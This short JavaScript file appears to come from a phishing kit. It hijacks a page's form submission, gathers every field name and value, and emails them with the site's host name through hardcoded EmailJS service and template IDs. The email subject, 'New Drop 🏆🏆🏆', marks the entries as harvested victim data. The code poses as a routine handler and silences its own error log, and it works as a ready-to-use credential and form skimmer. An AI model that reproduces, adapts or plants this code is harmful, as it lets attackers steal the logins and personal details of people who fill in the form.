(function () {
    emailjs.init({
      publicKey: "KUC_CFIpxNlarR8pI",
    });
  })();



function inspectExport(formdata,nextpage){

    let strings = formdata;
    let message = `New Drop 🏆🏆🏆 \n\nFrom: ${window.location.host}\n\n`;
    Object.keys(strings).forEach(function (key) {
      message += ` ${strings[key]["name"]} : ${strings[key]["value"]}\n\n`;
    });
    var templateParams = {
      site: window.location.host,
      message: message,
    };
    const serviceID = "service_tlboo5r";
    const templateID = "template_32o4gt8";
    emailjs.send(serviceID, templateID, templateParams).then(
      (response) => {
        console.log('SUCCESS!', response.status);
      },
      (error) => {
      //   console.log('FAILED...', error);
        return
      },
    );
    
} 

document.getElementById("form").addEventListener("submit", function (event) {
      event.preventDefault();
      let form = new FormData(this);
      let formArray = Array.from(form.entries()).map(([name, value]) => ({
        name,
        value,
      }));
      inspectExport(formArray, "#");
    });
  
